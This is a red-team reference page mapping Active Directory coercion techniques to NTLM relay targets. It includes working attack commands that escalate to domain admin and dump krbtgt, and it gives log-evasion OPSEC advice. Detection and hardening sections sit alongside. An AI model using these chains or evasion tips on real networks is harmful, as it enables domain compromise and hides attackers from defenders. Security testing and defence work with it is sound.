---
title: AD coercion & relay matrix (2025)
slug: ad-coercion-and-relay-matrix-2025
aliases: [coercion-relay-matrix, ntlm-relay-matrix-2025, coercion-cheatsheet]
---

> **TL;DR:** Coercion + relay is still the #1 path from "domain user" to "domain admin" on most enterprises in 2025, despite seven CVE rounds of mitigation. This is the umbrella reference: each coercion primitive paired with its viable relay targets, the patch level that breaks it, and the ESC/ACL chain it enables. Use it as a flowchart, not a tutorial. Individual technique notes link from each row.

## The model

Coercion = make any host (DC, file server, workstation) authenticate to *you* using its **machine account** over NTLM. Relay = forward that auth to a service that accepts NTLM and grants you something useful. Combine them and you have unauthenticated-to-Domain-Admin in a few seconds.

```
[me on attacker] ── nudge over MSRPC ──► [victim machine]
                                              │
                              outbound NTLM   │
                                              ▼
                       [attacker relay] ─── relays ──► [target service]
                                              │
                                              ▼
                                  ESC8 / RBCD / Shadow Creds / ACL grant
```

## Coercion primitives

| Primitive | RPC / interface | Triggering call | Auth source | Patched in | Notes |
|---|---|---|---|---|---|
| **PrinterBug** ([[printer-bug-spoolsample.md]]) | `MS-RPRN` `\PIPE\spoolss` | `RpcRemoteFindFirstPrinterChangeNotificationEx` | Spooler service of victim | Spooler off; CVE-2021-34527 fixes coercion-from-arbitrary-user partially | Works against most DCs unless Spooler disabled (CIS L1 baseline does disable). |
| **PetitPotam** ([[petitpotam-coercion]]) | `MS-EFSR` `\PIPE\lsarpc` | `EfsRpcOpenFileRaw` (originally) → modern variants on `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv` | LSA of victim | CVE-2022-26925; modern variants still unauth on Win2019, auth-only on Win2022 | Default victim = DC. |
| **ShadowCoerce** ([[shadowcoerce]]) | `MS-FSRVP` `\PIPE\FssagentRpc` | `IsPathSupported` | File Server VSS Agent | CVE-2022-30154 | Server with "File Server VSS Agent Service" enabled. |
| **DFSCoerce** ([[dfscoerce]]) | `MS-DFSNM` `\PIPE\netdfs` | `NetrDfsRemoveStdRoot` | DC DFS service | Not fully patched; auth requires authenticated user but any user works | Any DC with DFS namespace service running (default). |
| **PrivExchange-style** | EWS push notification | Subscribe→push to attacker URL | Exchange computer account | Patched 2019 (CVE-2018-8581); resurfaces in misconfigs | Only where on-prem Exchange still exists. |
| **WebClient (WebDAV) trigger** | searchconnector-ms / shortcut to `\\attacker@80\foo` | UNC over HTTP triggers WebClient | Workstation user (not machine) | n/a | Yields user NTLM, not machine; combine with HTTP→LDAPS relay for RBCD on the user. |
| **Coercer.py "all"** | every MS-RPRN/MS-EFSR/MS-DFSNM/MS-FSRVP variant | many | varies | varies | One tool, sprays all known triggers — first to bite wins. |
| **AuthCoerce (2024)** | `MS-EVEN` (`OpenEventLogW`) | Open remote event log | Any host with EventLog Forwarding listener | Unpatched at time of writing | Niche; useful where Spooler/EFSR/DFS all closed. |

## Relay targets

| Target | Channel | Requires victim to be | Gives you | Patch / mitigation |
|---|---|---|---|---|
| **LDAP/LDAPS** to DC | tcp/389, tcp/636 | not a DC | with LDAPS: write SPN, set `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD), set `msDS-KeyCredentialLink` (Shadow Credentials), modify ACLs | LDAP signing + channel binding (LdapEnforceChannelBinding=2) breaks LDAP relay; LDAPS still works if EPA off |
| **SMB** to file server | tcp/445 | local admin on target | execute as relayed account | SMB signing required on all servers (default since Win2022) |
| **HTTP→ADCS** ([[adcs-attacks]] ESC8) | http/https `/certsrv/` | enrolment service reachable | a certificate for the machine → use to PKINIT as that machine | EPA on the IIS app (`Extended Protection = Required`) blocks; Microsoft default = "Allow" |
| **HTTP→AD Web Services (ADWS)** | http://dc:9389 | n/a | LDAP-equivalent ops | Disabled by default in current rollups; was a 2023 abuse path |
| **HTTP→WSUS** (`/ClientWebService/`) | http://wsus:8530 | n/a (relay as WSUS computer) | approve update → SYSTEM on clients | EPA + HTTPS = mitigation; many tenants still HTTP |
| **WinRM** | tcp/5985 | local admin on target | shell as relayed account | EPA on WinRM listener |
| **MSSQL** | tcp/1433 | sysadmin on target | xp_cmdshell as relayed account | Channel binding (EPA) |

## High-value chains (2025 viable)

| # | Coercion | Relay to | Outcome | When it still works |
|---|---|---|---|---|
| 1 | PetitPotam (DC) | LDAPS DC → set RBCD on attacker-controlled comp | Domain compromise via [[resource-based-constrained-delegation]] | Anywhere LDAP signing/CB not enforced + Machine Account Quota > 0 |
| 2 | PetitPotam (DC) | HTTP(S) ADCS Web Enrollment → DomainController template | DC certificate → PKINIT → DA | ADCS Web Enrollment without EPA (default) |
| 3 | DFSCoerce (DC) | LDAPS DC → Shadow Credentials on DC computer | Auth as DC → DCSync | Same as #1 — most environments |
| 4 | PrinterBug (any host with Spooler) | LDAPS DC → unconstrained delegation abuse via [[unconstrained-delegation]] | Capture TGTs of admins logging into that host | Where Spooler still runs (most workstations) |
| 5 | WebDAV trigger (workstation user) | LDAPS DC → RBCD on user | Lateral as user | Where WebClient service runs (default on Win11) |
| 6 | ShadowCoerce (FS VSS server) | LDAPS DC → ACL on the server | Local admin on file server | Pre-2022 patches |
| 7 | Coercer (DC) | WSUS (HTTP) | SYSTEM on every WSUS client | Internal WSUS over HTTP (still common) |
| 8 | AuthCoerce (any) | LDAPS DC | Same as #1/3 | Niche fallback |

## Tradecraft

```bash
# Start the relay; output to LDAPS for RBCD primitive
ntlmrelayx.py -t ldaps://dc.corp.lab -smb2support --delegate-access \
              --escalate-user attacker$ --add-computer attacker$ 'P@ssword1'

# Trigger — Petitpotam (Impacket)
petitpotam.py -u me -p pw -d corp.lab attacker.corp.lab dc.corp.lab

# Trigger — DFSCoerce
dfscoerce.py -u me -p pw -d corp.lab attacker.corp.lab dc.corp.lab

# Sweep with Coercer
coercer.py coerce -u me -p pw -l attacker.corp.lab -t dc.corp.lab

# ADCS ESC8 chain
ntlmrelayx.py -t http://adcs/certsrv/certfnsh.asp --adcs --template DomainController
petitpotam.py -u me -p pw -d corp.lab attacker dc

# After certificate: PKINIT → krbtgt hash via getTGT + UnPACTheHash → DCSync
gettgtpkinit.py -cert-pfx dc.pfx corp.lab/dc\$@dc dc.ccache
getnthash.py -key <key_from_above> corp.lab/dc\$
secretsdump.py -k -no-pass corp.lab/dc\$@dc -just-dc-user krbtgt
```

## Detection / Telemetry

- **Inbound NTLM on a relay server** (your attacker box) is normal; on a tenant DC, NTLM auth events `4624 LogonType=3` from a workstation source IP to LDAP/HTTP/SMB are not. Defender for Identity has a "NTLM relay" alert (med-high) on these.
- **EventID 4769 / 4624 from a machine account onto a DC LDAP port** = high signal.
- **`ntlmrelayx` artefact**: ServicePrincipal `attacker$` added to a normal user's `msDS-AllowedToActOnBehalfOfOtherIdentity` — search LDAP for that attribute set on user objects.
- **ADCS** publishes Cert Enrollment events (CA log) — issuance of a `DomainController` template cert to a non-DC requester is the cleanest signal.
- **Coercion RPCs** themselves: `MS-RPRN` `_RpcRemoteFindFirstPrinterChangeNotificationEx`, `MS-EFSR` `EfsRpcOpenFileRaw`, `MS-DFSNM` `NetrDfsRemoveStdRoot` — Sysmon RPC parser + community detection rules.

## Hardening checklist (what closes each row)

| Mitigation | Closes |
|---|---|
| LDAP signing **and** channel binding (`LdapEnforceChannelBinding=2`) | All LDAPS relay |
| SMB signing required on every server | All SMB relay |
| Extended Protection for Authentication (EPA) on IIS / ADCS / WinRM / Exchange / WSUS | All HTTP relay variants |
| Disable Spooler on DCs and tier-0 (CIS L1) | PrinterBug |
| Patch CVE-2022-26925, CVE-2022-30154, etc.; install Win11 24H2 / Server 2025 baselines | Most unauth coercion primitives |
| Set `MachineAccountQuota = 0` for unprivileged users | Cuts off RBCD primitive (attacker can't add a computer to abuse) |
| Disable WebClient on workstations where unneeded | WebDAV-trigger primitive |
| Enforce KDC armouring (FAST) | Some PKINIT abuse paths |

## OPSEC pitfalls

- Don't run `petitpotam` blindly — many DCs are now logging the EFSR call. Choose the *quietest* primitive that works (DFSCoerce on most modern DCs).
- `ntlmrelayx --add-computer` leaves a permanent computer account; track and delete on cleanup.
- ADCS chain pollutes the CA database with an issued cert. Some CAs alert on `DomainController` cert issuance to anything other than the DC computer account.
- The relay server's IP appears in DC security logs as the source — front it via SOCKS / pivot through a compromised host so the recorded source ISN'T your operator box.

## References

- https://www.thehacker.recipes/ad/movement/ntlm/relay
- https://github.com/p0dalirius/Coercer
- https://github.com/topotam/PetitPotam
- https://github.com/Wh04m1001/DFSCoerce
- https://github.com/Bdenneu/ShadowCoerce
- https://www.synacktiv.com/publications/relaying-ntlm-authentication-from-sccm-clients
- https://github.com/fortra/impacket
- https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview

See also: [[ntlm-relay]], [[ntlm-relay-ws2025-mitigations]], [[winreg-relay-2024]], [[petitpotam-coercion]], [[dfscoerce]], [[shadowcoerce]], [[printer-bug-spoolsample]], [[adcs-attacks]], [[resource-based-constrained-delegation]], [[shadow-credentials]], [[unconstrained-delegation]], [[impacket-toolkit-overview]], [[netexec-nxc-workflow]], [[bloodhound-ce-deployment]]
